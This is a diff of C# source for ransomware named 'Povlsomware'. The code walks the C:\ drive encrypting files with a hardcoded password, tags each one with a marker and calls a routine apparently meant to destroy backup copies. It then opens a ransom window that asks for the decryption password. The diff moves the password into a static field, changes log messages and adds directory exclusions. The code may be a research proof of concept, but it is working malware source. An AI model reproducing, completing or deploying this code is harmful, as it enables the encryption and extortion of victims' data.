@@ -1,12 +1,13 @@
 ﻿using System;
 using System.Text;
+using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.IO;
 using System.Linq;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Security.Principal;
 using System.Management;
+
 
 namespace Povlsomware
 {
@@ -14,9 +15,16 @@ namespace Povlsomware
     {
         public static int count = 0;
         public static List<string> myFiles = new List<string>();
+        private static string password = "blahblah"; //The Encryption password. Change to your needs. 
+
+        [STAThread]
+        public static string getPass()
+        {
+            return password;
+        }
+
         static void Main(string[] args)
         {
-
             //Start the attack
             Attack();
 
@@ -24,8 +32,10 @@ namespace Povlsomware
             DestroyCopy();
 
             //Creates a popup that lets you view the encrypted files and add the password
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
             PayM3 thx = new PayM3();
-            System.Windows.Forms.Application.Run(thx);
+            Application.Run(thx);
         }
         //Decrypt the file
         public static void DecryptFile(string fileEncrypted, string password)
@@ -47,7 +57,7 @@ namespace Povlsomware
             using (var stream = new FileStream(fileEncrypted, FileMode.Append))
             {
                 stream.Write(bytesDecrypted, 0, bytesDecrypted.Length);
-                Console.WriteLine(fileEncrypted);
+                Console.WriteLine("Decrypted: " + fileEncrypted);
             }
         }
 
@@ -78,8 +88,6 @@ namespace Povlsomware
         //Encrypt the file
         public static void EncryptFile(string fileUnencrypted)
         {
-            // The encryption password
-            string password = "blahblah";
             // Hash the password with SHA256
             byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
@@ -101,7 +109,7 @@ namespace Povlsomware
                     byte[] mark = Encoding.UTF8.GetBytes("P0vL");
                     stream.Write(mark, 0, mark.Length);
                     stream.Write(bytesEncrypted, 0, bytesEncrypted.Length);
-                    Console.WriteLine(fileUnencrypted);
+                    Console.WriteLine("Encrypted: " + fileUnencrypted);
                     count++;
                     myFiles.Add(fileUnencrypted);
                 }
@@ -110,15 +118,14 @@ namespace Povlsomware
 
         public static void Attack()
         {
-            String startDirectory = "C:\\"; //Where to start from
+            string startDirectory = @"C:\"; //Where to start from
             ProcessDirectory(startDirectory, 1, "");
         }
 
-        public static void UndoAttack(string password)
+        public static void UndoAttack(string decryption_password)
         {
-            String startDirectory = "C:\\"; //Where to start from
-            ProcessDirectory(startDirectory, 0, password);
-            System.Windows.Forms.Application.Exit();
+            string startDirectory = @"C:\"; //Where to start from
+            ProcessDirectory(startDirectory, 0, decryption_password);
         }
 
         // Process all files in the directory passed in, recurse on any directories 
@@ -139,7 +146,7 @@ namespace Povlsomware
             foreach (string subdirectory in subdirectoryEntries)
                 try
                 {   //Dont go into windows program files and temporary internet files. And other #ew ugly
-                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\") && !subdirectory.Contains("\\Povlsomware-master\\"))
+                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\") && !subdirectory.Contains("\\Povlsomware-master\\") && !subdirectory.Contains("\\Povlsomware\\"))
                     {
                         ProcessDirectory(subdirectory, action, password);
                     }
